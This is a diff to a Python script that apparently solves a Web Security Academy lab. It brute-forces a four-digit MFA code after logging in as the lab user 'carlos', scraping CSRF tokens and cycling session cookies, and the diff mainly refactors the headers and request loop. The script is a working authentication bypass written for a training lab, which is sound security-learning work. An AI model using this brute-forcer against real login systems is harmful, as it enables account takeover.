@@ -3,17 +3,18 @@ import requests
 from queue import Queue
 from bs4 import BeautifulSoup
 
-server_name = "0a1000430352501e8271bfdf0019003c"
+server_name = "0a5b00b7046f980b817e98be00160013"
 
-url1 = f"https://{server_name}.web-security-academy.net/login"
-url2 = f"https://{server_name}.web-security-academy.net/login2"
-headers_get = {
+base_url = f"https://{server_name}.web-security-academy.net"
+url1 = f"{base_url}/login"
+url2 = f"{base_url}/login2"
+
+headers = {
     "Host": f"{server_name}.web-security-academy.net",
     "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
     "Accept-Language": "en-US,en;q=0.5",
     "Accept-Encoding": "gzip, deflate, br",
-    "Referer": f"https://{server_name}.web-security-academy.net/login",
     "Upgrade-Insecure-Requests": "1",
     "Sec-Fetch-Dest": "document",
     "Sec-Fetch-Mode": "navigate",
@@ -22,26 +23,6 @@ headers_get = {
     "Priority": "u=0, i",
     "Te": "trailers"
 }
-
-headers_post = {
-    "Host": f"{server_name}.web-security-academy.net",
-    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Accept-Encoding": "gzip, deflate, br",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "Origin": f"https://{server_name}.web-security-academy.net",
-    "Referer": f"https://{server_name}.web-security-academy.net/login2",
-    "Upgrade-Insecure-Requests": "1",
-    "Sec-Fetch-Dest": "document",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-User": "?1",
-    "Priority": "u=0, i",
-    "Te": "trailers"
-}
-
-
 
 queue = Queue()
 
@@ -52,10 +33,11 @@ def getCsrf(response_data):
     csrf_token = soup.find("input", {"name": "csrf"})["value"]
     return csrf_token
 
+
 # Check if the mfa is correct
 def mfaCheck(response, temp_mfa):
     if response.status_code == 302:
-        print(f"[*] MFA Code Found: {temp_mfa}")
+        print(f"\n[*] MFA Code Found: {temp_mfa}")
         for key, value in response.headers.items():
             print(f"{key}: {value}")
             return 1
@@ -63,60 +45,56 @@ def mfaCheck(response, temp_mfa):
         print(f"[-] Tried {temp_mfa} | Response: {response.status_code}")
         return 0
 
+
 def main():
     found = False
 
-    # GET /Login
-    response = requests.get(url1, headers=headers_get, allow_redirects=False)
-    # print(f"\n--------------------------\nG1\nheaders: {headers_get}\n"
-    #       f"{response}\n{response.headers}\n{response.text}")
+    # GET /Login -> To get a session key and a CSRF token.
+    response = requests.get(url1, headers=headers, allow_redirects=False)
 
     while not found:
         for i in range(1500):
             queue.put(str(i).zfill(4))
 
         while not queue.empty():
-            # POST /Login
+            # POST /Login -> Logging in to the account.
             session = response.cookies.get_dict().get("session")
-            headers_post["Cookie"] = f"session={session}"
+            headers["Cookie"] = f"session={session}"
+            headers["Referer"] = url1
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+
             csrf = getCsrf(response)
             data = f"csrf={csrf}&username=carlos&password=montoya"
-            headers_post["Content-Length"] = str(len(data))
-            response = requests.post(url1, headers=headers_post, data=data, allow_redirects=False)
-            # print(f"\n--------------------------\nP1\nheaders: {headers_post}\ndata: {data}\n"
-            #       f"{response}\n{response.headers}\n{response.text}")
+            headers["Content-Length"] = str(len(data))
 
-            # GET /Login2
+            response = requests.post(url1, headers=headers, data=data, allow_redirects=False)
+
+            # GET /Login2 -> The server generate an MFA by requesting the page
             session = response.cookies.get_dict().get("session")
-            headers_get["Cookie"] = f"session={session}"
-            response = requests.get(url2, headers=headers_get, allow_redirects=False)
-            # print(f"\n--------------------------\nG2\nheaders: {headers_get}\n"
-            #       f"{response}\n{response.headers}\n{response.text}")
+            headers["Cookie"] = f"session={session}"
+            headers["Referer"] = url2
+            del headers["Content-Type"]
+            del headers["Content-Length"]
 
-            # POST /Login2 (1)
+            response = requests.get(url2, headers=headers, allow_redirects=False)
+
+            # POST /Login2 (twice) -> Trying to log in with an MFA value.
             csrf = getCsrf(response)
-            headers_post["Cookie"] = f"session={session}"
-            temp_mfa = queue.get()
-            data = f"csrf={csrf}&mfa-code={temp_mfa}"
-            headers_post["Content-Length"] = str(len(data))
-            response = requests.post(url2, headers=headers_post, data=data, allow_redirects=False)
-            # print(f"\n--------------------------\nP2(1)\nheaders: {headers_post}\ndata: {data}\n"
-            #       f"{response}\n{response.headers}\n{response.text}")
-            if mfaCheck(response, temp_mfa):
-                found = True
-                print(response.headers)
-                break
+            headers["Cookie"] = f"session={session}"
+            headers["Referer"] = url2
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
 
-            # POST /Login2 (2)
-            temp_mfa = queue.get()
-            data = f"csrf={csrf}&mfa-code={temp_mfa}"
-            headers_post["Content-Length"] = str(len(data))
-            response = requests.post(url2, headers=headers_post, data=data, allow_redirects=False)
-            # print(f"\n--------------------------\nP2(2)\nheaders: {headers_post}\ndata: {data}\n"
-            #       f"{response}\n{response.headers}\n{response.text}")
-            if mfaCheck(response, temp_mfa):
-                found = True
-                print(response.headers)
+            for _ in range(2):
+                temp_mfa = queue.get()
+                data = f"csrf={csrf}&mfa-code={temp_mfa}"
+                headers["Content-Length"] = str(len(data))
+                response = requests.post(url2, headers=headers, data=data, allow_redirects=False)
+                if mfaCheck(response, temp_mfa):
+                    found = True
+                    print(response.headers)
+                    break
+
+            if found:
                 break
 
 
